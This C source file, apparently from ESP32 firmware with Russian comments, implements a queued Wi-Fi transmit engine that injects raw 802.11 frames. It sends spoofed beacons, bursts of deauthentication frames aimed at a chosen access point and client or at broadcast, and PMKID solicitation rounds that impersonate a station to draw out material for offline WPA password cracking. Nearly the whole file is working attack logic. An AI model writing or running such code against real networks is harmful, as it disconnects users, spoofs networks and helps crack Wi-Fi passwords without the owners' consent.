#include "tx_engine.h"

#include "tx_frame_builder.h" /* сборка beacon/auth/assoc (слой 2) */
#include "tx_hal_80211.h"     /* отправка кадра (слой 1) */
#include "tx_pmkid_select.h"  /* RSN точки -> выбор для assoc (чистый мост) */

#include "wifi_worker.h"          /* состояние владельца радио */
#include "wifi_channel_hopper.h"  /* текущий канал радио */
#include "tx_config.h"            /* модель настроек пакета (канал, ssid и т.д.) */

#include <stdatomic.h>
#include <stdio.h>  /* snprintf для безопасного копирования ssid */
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_wifi.h" /* esp_wifi_get_mac, WIFI_IF_STA */

static const char *TAG = "TX_ENGINE";

esp_err_t tx_engine_send_beacon_now(const char *ssid)
{
    /* --- Шаг 1. Проверяем аргумент. Длину SSID подробно проверит builder,
     * здесь ловим только очевидный NULL. --- */
    if (ssid == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    /* --- Шаг 2. Проверяем, что радио в окне для инъекции.
     * Мы НЕ поднимаем радио сами (это дело wifi_worker). Если воркер не держит
     * PROMISCUOUS — передавать некуда и незачем, честно отказываемся. --- */
    if (wifi_worker_get_state() != WIFI_WORKER_STATE_PROMISCUOUS) {
        return ESP_ERR_INVALID_STATE;
    }

    /* --- Шаг 3. Узнаём свой MAC (станет SA и BSSID кадра). --- */
    uint8_t mac[6];
    esp_err_t err = esp_wifi_get_mac(WIFI_IF_STA, mac);
    if (err != ESP_OK) {
        return err;
    }

    /* --- Шаг 4. Выбираем канал для DS-поля beacon ИЗ НАСТРОЙКИ.
     * Единственный источник истины теперь tx_config: экран «TX ESP» задаёт канал,
     * а движок его читает — так отправка реально зависит от настройки.
     *   Auto (0)  -> берём фактический текущий канал радио у хоппера (он публикуется
     *                и в режиме hopping, и в фиксированном). Пишем именно его, чтобы
     *                маяк не заявлял канал, отличный от того, на котором реально уйдёт
     *                в эфир;
     *   1..13     -> задел на будущее: пойдёт конкретный канал из настройки (сейчас
     *                UI оставляет только Auto, но проводка уже готова).
     * Если канал окажется некорректным (0), это поймает builder на шаге 5. --- */
    uint8_t channel = tx_config_channel();
    if (channel == TX_CONFIG_CHANNEL_AUTO) {
        channel = wifi_channel_hopper_current_channel();
    }

    /* --- Шаг 5. Собираем beacon в локальный буфер на стеке.
     * TX_BEACON_MAX_LEN (128) с запасом вмещает кадр; буфер живёт только до конца
     * функции — этого достаточно, т.к. tx_hal (через esp_wifi_80211_tx) копирует
     * кадр во внутренние буферы драйвера ДО возврата. Висячих указателей нет. --- */
    uint8_t frame[TX_BEACON_MAX_LEN];
    size_t frame_len = 0;
    err = tx_frame_build_beacon(frame, sizeof(frame), &frame_len, mac, ssid,
                                channel);
    if (err != ESP_OK) {
        return err;
    }

    /* --- Шаг 6. Отправляем. use_system_sequence = true: номер
     * последовательности в кадре проставит система. --- */
    return tx_hal_80211_send(frame, frame_len, true);
}

/* =====================================================================
 *  Слой 3b: собственная задача TX и очередь команд
 * =====================================================================
 *
 * Чтобы UI мог просить отправку НЕ блокируясь и НЕ трогая радио сам, заводим
 * отдельную задачу. UI кладёт команду в очередь (моментально), а задача достаёт
 * её и выполняет синхронное ядро tx_engine_send_beacon_now() в своём контексте.
 */

/* Тип команды. */
typedef enum {
    TX_ENGINE_CMD_SEND_BEACON,
    TX_ENGINE_CMD_SEND_DEAUTH,
    TX_ENGINE_CMD_GET_PMKID,
} tx_engine_cmd_type_t;

/* Элемент очереди. ВСЕ параметры хранятся ВСТРОЕННО (не указателями): очередь
 * копирует элемент по значению, и указатель на данные вызывающего мог бы
 * протухнуть до обработки. `type` говорит, какую ветку union читать — одна
 * команда использует только один набор параметров, поэтому union экономит память. */
typedef struct {
    tx_engine_cmd_type_t type;
    uint8_t count; /* сколько кадров отправить за эту команду (burst), >=1 */
    union {
        struct {
            char ssid[33]; /* 32 символа + NUL */
        } beacon;
        struct {
            uint8_t bssid[6];  /* MAC точки (SA+BSSID) */
            uint8_t target[6]; /* MAC клиента или broadcast */
            uint16_t reason;   /* код причины 802.11 */
        } deauth;
        struct {
            uint8_t bssid[6];          /* MAC целевой точки */
            char ssid[33];             /* имя сети цели (32 + NUL) */
            tx_rsn_selection_t rsn;    /* выбор защиты для assoc-req */
            bool has_rsn;              /* true — rsn заполнен; false — слать дефолт */
        } pmkid;
    } u;
} tx_engine_cmd_t;

/* Небольшая пауза между кадрами в burst: не забиваем очередь драйвера разом и
 * даём радио «выдохнуть» между инъекциями. При count==1 пауза не используется. */
#define TX_ENGINE_BURST_GAP_MS 2U

/* Пауза МЕЖДУ auth и assoc в одном раунде добычи PMKID. Реальная станция сначала
 * получает ответ на auth, и лишь потом шлёт assoc. Мы не ведём полный конечный
 * автомат станции (мы в promiscuous, не настоящий STA), поэтому «вслепую» даём
 * точке мгновение ответить на auth, прежде чем слать assoc. 15 мс — компромисс:
 * достаточно для ответа близкой точки, но раунд остаётся быстрым. */
#define TX_ENGINE_PMKID_AUTH_GAP_MS 15U

/* Пауза МЕЖДУ раундами провокации (burst). Крупнее межкадровой: между попытками
 * точке надо успеть прогнать/сбросить начатый хендшейк. */
#define TX_ENGINE_PMKID_ROUND_GAP_MS 60U

/* Параметры задачи. Стек 4096 с запасом покрывает сборку кадра (~128 байт на
 * стеке) и вызовы esp_wifi_*. Приоритет 2 — как у других фоновых Wi-Fi-задач
 * (port scan, pcap writer), чтобы не теснить UI (4) и не голодать. Глубина
 * очереди 4: несколько запросов подряд не потеряются. */
#define TX_ENGINE_QUEUE_LEN   4U
#define TX_ENGINE_TASK_STACK  4096
#define TX_ENGINE_TASK_PRIO   2

/* Состояние модуля (как у всех воркеров проекта): дескрипторы очереди и задачи. */
static QueueHandle_t s_cmd_queue;
static TaskHandle_t s_task;
/* Счётчик успешно отправленных кадров. Пишет задача TX, читает UI → atomic. */
static atomic_uint_fast32_t s_sent_count;

/* Синхронное ядро отправки deauth (внутреннее, зовётся из задачи TX). В отличие
 * от beacon здесь MAC/канал не нужны — bssid и target приходят готовыми. Как и
 * beacon, шлём только когда радио в PROMISCUOUS. */
static esp_err_t send_deauth_now(const uint8_t bssid[6],
                                 const uint8_t target[6], uint16_t reason)
{
    if (wifi_worker_get_state() != WIFI_WORKER_STATE_PROMISCUOUS) {
        return ESP_ERR_INVALID_STATE;
    }
    uint8_t frame[TX_DEAUTH_LEN];
    size_t frame_len = 0;
    esp_err_t err = tx_frame_build_deauth(frame, sizeof(frame), &frame_len,
                                          bssid, target, reason);
    if (err != ESP_OK) {
        return err;
    }
    return tx_hal_80211_send(frame, frame_len, true);
}

/* Синхронное ядро одного раунда добычи PMKID (внутреннее, зовётся из задачи TX).
 * Прикидываемся станцией для цели bssid/ssid: шлём Open-System Auth (seq 1), ждём
 * мгновение, затем Association Request с её RSN (или дефолтом при rsn == NULL).
 * Радио не поднимаем и канал не меняем — шлём на текущем канале, только в
 * PROMISCUOUS. Возвращает ESP_OK, только если ОБА кадра приняты драйвером; иначе —
 * код первой ошибки (частичный раунд: auth мог уйти, assoc — нет). */
static esp_err_t send_pmkid_solicit_now(const uint8_t bssid[6], const char *ssid,
                                        const tx_rsn_selection_t *rsn)
{
    if (wifi_worker_get_state() != WIFI_WORKER_STATE_PROMISCUOUS) {
        return ESP_ERR_INVALID_STATE;
    }

    /* Наш STA-MAC станет SA (Addr2) в обоих кадрах — кадры реально ОТ НАС. */
    uint8_t mac[6];
    esp_err_t err = esp_wifi_get_mac(WIFI_IF_STA, mac);
    if (err != ESP_OK) {
        return err;
    }

    /* Один буфер на оба кадра: assoc (<=128) не меньше auth (30), а живёт буфер
     * только до возврата — драйвер копирует кадр у себя до возврата из send. */
    uint8_t frame[TX_ASSOC_REQ_MAX_LEN];
    size_t frame_len = 0;

    /* 1) Authentication (open system, seq 1). */
    err = tx_frame_build_auth(frame, sizeof(frame), &frame_len, bssid, mac);
    if (err != ESP_OK) {
        return err;
    }
    err = tx_hal_80211_send(frame, frame_len, true);
    if (err != ESP_OK) {
        return err;
    }

    /* Дать точке мгновение ответить на auth, прежде чем слать assoc. */
    vTaskDelay(pdMS_TO_TICKS(TX_ENGINE_PMKID_AUTH_GAP_MS));

    /* 2) Association Request с RSN цели (rsn == NULL → дефолт WPA2-PSK/CCMP). */
    err = tx_frame_build_assoc_req(frame, sizeof(frame), &frame_len, bssid, mac,
                                   ssid, rsn);
    if (err != ESP_OK) {
        return err;
    }
    return tx_hal_80211_send(frame, frame_len, true);
}

static void tx_engine_task(void *arg)
{
    (void)arg;
    tx_engine_cmd_t cmd;
    for (;;) {
        /* portMAX_DELAY здесь допустим: это выделенная воркер-задача, ей можно
         * бесконечно ждать свою входную очередь — UI при этом живёт отдельно. */
        if (xQueueReceive(s_cmd_queue, &cmd, portMAX_DELAY) != pdTRUE) {
            continue;
        }
        /* Burst: шлём count одинаковых кадров подряд. Считаем, сколько реально
         * ушло (ok), и логируем ОДНОЙ строкой по итогу — чтобы не спамить лог при
         * большом count. Пауза ставится только МЕЖДУ кадрами, не после последнего. */
        switch (cmd.type) {
        case TX_ENGINE_CMD_SEND_BEACON: {
            uint8_t ok = 0;
            esp_err_t last_err = ESP_OK;
            for (uint8_t i = 0; i < cmd.count; ++i) {
                esp_err_t err = tx_engine_send_beacon_now(cmd.u.beacon.ssid);
                if (err == ESP_OK) {
                    ok++;
                    atomic_fetch_add_explicit(&s_sent_count, 1U,
                                              memory_order_relaxed);
                } else {
                    last_err = err;
                }
                if (i + 1U < cmd.count) {
                    vTaskDelay(pdMS_TO_TICKS(TX_ENGINE_BURST_GAP_MS));
                }
            }
            if (ok == cmd.count) {
                ESP_LOGI(TAG, "beacon x%u sent ssid='%s'", cmd.count,
                         cmd.u.beacon.ssid);
            } else {
                ESP_LOGW(TAG, "beacon %u/%u sent ssid='%s': %s", ok, cmd.count,
                         cmd.u.beacon.ssid, esp_err_to_name(last_err));
            }
            break;
        }
        case TX_ENGINE_CMD_SEND_DEAUTH: {
            uint8_t ok = 0;
            esp_err_t last_err = ESP_OK;
            for (uint8_t i = 0; i < cmd.count; ++i) {
                esp_err_t err = send_deauth_now(cmd.u.deauth.bssid,
                                                cmd.u.deauth.target,
                                                cmd.u.deauth.reason);
                if (err == ESP_OK) {
                    ok++;
                    atomic_fetch_add_explicit(&s_sent_count, 1U,
                                              memory_order_relaxed);
                } else {
                    last_err = err;
                }
                if (i + 1U < cmd.count) {
                    vTaskDelay(pdMS_TO_TICKS(TX_ENGINE_BURST_GAP_MS));
                }
            }
            if (ok == cmd.count) {
                ESP_LOGI(TAG, "deauth x%u sent", cmd.count);
            } else {
                ESP_LOGW(TAG, "deauth %u/%u sent: %s", ok, cmd.count,
                         esp_err_to_name(last_err));
            }
            break;
        }
        case TX_ENGINE_CMD_GET_PMKID: {
            /* RSN берём из команды, если он заполнен; иначе NULL → дефолт у сборщика. */
            const tx_rsn_selection_t *rsn =
                cmd.u.pmkid.has_rsn ? &cmd.u.pmkid.rsn : NULL;
            uint8_t ok = 0;
            esp_err_t last_err = ESP_OK;
            for (uint8_t i = 0; i < cmd.count; ++i) {
                esp_err_t err = send_pmkid_solicit_now(cmd.u.pmkid.bssid,
                                                       cmd.u.pmkid.ssid, rsn);
                if (err == ESP_OK) {
                    ok++;
                    /* Успешный раунд = 2 кадра в эфир (auth + assoc). */
                    atomic_fetch_add_explicit(&s_sent_count, 2U,
                                              memory_order_relaxed);
                } else {
                    last_err = err;
                }
                if (i + 1U < cmd.count) {
                    vTaskDelay(pdMS_TO_TICKS(TX_ENGINE_PMKID_ROUND_GAP_MS));
                }
            }
            if (ok == cmd.count) {
                ESP_LOGI(TAG, "pmkid solicit x%u ssid='%s'", cmd.count,
                         cmd.u.pmkid.ssid);
            } else {
                ESP_LOGW(TAG, "pmkid solicit %u/%u ssid='%s': %s", ok, cmd.count,
                         cmd.u.pmkid.ssid, esp_err_to_name(last_err));
            }
            break;
        }
        default:
            break;
        }
    }
}

esp_err_t tx_engine_init(void)
{
    /* Идемпотентность: если задача уже есть — ничего не пересоздаём. */
    if (s_task != NULL) {
        return ESP_OK;
    }
    s_cmd_queue = xQueueCreate(TX_ENGINE_QUEUE_LEN, sizeof(tx_engine_cmd_t));
    if (s_cmd_queue == NULL) {
        return ESP_ERR_NO_MEM;
    }
    if (xTaskCreate(tx_engine_task, "tx_engine", TX_ENGINE_TASK_STACK, NULL,
                    TX_ENGINE_TASK_PRIO, &s_task) != pdPASS) {
        /* Задача не создалась — откатываем очередь, чтобы не оставлять половину. */
        vQueueDelete(s_cmd_queue);
        s_cmd_queue = NULL;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t tx_engine_request_beacon(const char *ssid, uint8_t count)
{
    if (ssid == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_cmd_queue == NULL) {
        return ESP_ERR_INVALID_STATE; /* не звали tx_engine_init() */
    }
    /* Длину проверяем здесь заранее (builder проверит ещё раз при сборке). */
    size_t ssid_len = strnlen(ssid, 33U);
    if (ssid_len < 1U || ssid_len > 32U) {
        return ESP_ERR_INVALID_ARG;
    }

    /* Готовим команду: копируем ssid ВНУТРЬ неё. snprintf гарантирует завершающий
     * NUL и не вылезет за размер поля. count == 0 нормализуем к 1. */
    tx_engine_cmd_t cmd = {
        .type = TX_ENGINE_CMD_SEND_BEACON,
        .count = count ? count : 1U,
    };
    snprintf(cmd.u.beacon.ssid, sizeof(cmd.u.beacon.ssid), "%s", ssid);

    /* Кладём в очередь без ожидания (таймаут 0): UI не должен блокироваться. */
    if (xQueueSend(s_cmd_queue, &cmd, 0) != pdTRUE) {
        return ESP_ERR_TIMEOUT; /* очередь заполнена */
    }
    return ESP_OK;
}

esp_err_t tx_engine_request_deauth(const uint8_t bssid[6],
                                   const uint8_t target[6],
                                   uint16_t reason_code,
                                   uint8_t count)
{
    if (bssid == NULL || target == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_cmd_queue == NULL) {
        return ESP_ERR_INVALID_STATE; /* не звали tx_engine_init() */
    }

    /* Копируем адреса ВНУТРЬ команды (очередь копирует по значению).
     * count == 0 нормализуем к 1. */
    tx_engine_cmd_t cmd = {
        .type = TX_ENGINE_CMD_SEND_DEAUTH,
        .count = count ? count : 1U,
    };
    memcpy(cmd.u.deauth.bssid, bssid, 6);
    memcpy(cmd.u.deauth.target, target, 6);
    cmd.u.deauth.reason = reason_code;

    if (xQueueSend(s_cmd_queue, &cmd, 0) != pdTRUE) {
        return ESP_ERR_TIMEOUT; /* очередь заполнена */
    }
    return ESP_OK;
}

esp_err_t tx_engine_request_pmkid(const uint8_t bssid[6], const char *ssid,
                                  const wifi_rsn_info_t *rsn_info, uint8_t count)
{
    if (bssid == NULL || ssid == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_cmd_queue == NULL) {
        return ESP_ERR_INVALID_STATE; /* не звали tx_engine_init() */
    }
    size_t ssid_len = strnlen(ssid, 33U);
    if (ssid_len < 1U || ssid_len > 32U) {
        return ESP_ERR_INVALID_ARG;
    }

    /* Копируем всё ВНУТРЬ команды (очередь копирует по значению). RSN точки сразу
     * переводим в компактный выбор для assoc; если его нет — has_rsn=false, и
     * задача пошлёт дефолт. */
    tx_engine_cmd_t cmd = {
        .type = TX_ENGINE_CMD_GET_PMKID,
        .count = count ? count : 1U,
    };
    memcpy(cmd.u.pmkid.bssid, bssid, 6);
    snprintf(cmd.u.pmkid.ssid, sizeof(cmd.u.pmkid.ssid), "%s", ssid);
    cmd.u.pmkid.has_rsn =
        tx_pmkid_rsn_selection_from_info(rsn_info, &cmd.u.pmkid.rsn);

    if (xQueueSend(s_cmd_queue, &cmd, 0) != pdTRUE) {
        return ESP_ERR_TIMEOUT; /* очередь заполнена */
    }
    return ESP_OK;
}

uint32_t tx_engine_sent_count(void)
{
    return (uint32_t)atomic_load_explicit(&s_sent_count, memory_order_relaxed);
}

void tx_engine_reset_sent_count(void)
{
    /* Простая атомарная запись нуля: читатель (UI) и писатель (задача TX) работают
     * со счётчиком только через atomics, поэтому отдельная блокировка не нужна. */
    atomic_store_explicit(&s_sent_count, 0U, memory_order_relaxed);
}
